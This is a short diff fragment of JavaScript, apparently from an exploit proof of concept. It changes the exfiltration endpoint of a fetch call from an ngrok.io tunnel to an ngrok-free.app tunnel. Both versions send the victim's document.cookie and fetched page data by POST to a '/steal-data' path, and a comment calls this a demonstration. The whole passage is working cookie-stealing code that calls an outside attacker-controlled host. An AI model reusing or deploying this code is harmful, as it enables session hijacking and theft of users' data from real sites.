@@ -21,7 +21,7 @@
         .then(response => response.text())
         .then(data => {
             // Send the cookies and response data to your server for demonstration
-            fetch('https://644a-2401-4900-1c82-da4e-c470-a27-bb8b-2114.ngrok.io/steal-data', {
+            fetch('https://644a-2401-4900-1c82-da4e-c470-a27-bb8b-2114.ngrok-free.app/steal-data', {
                 method: 'POST',
                 body: JSON.stringify({ cookies: document.cookie, response: data }),
                 headers: {
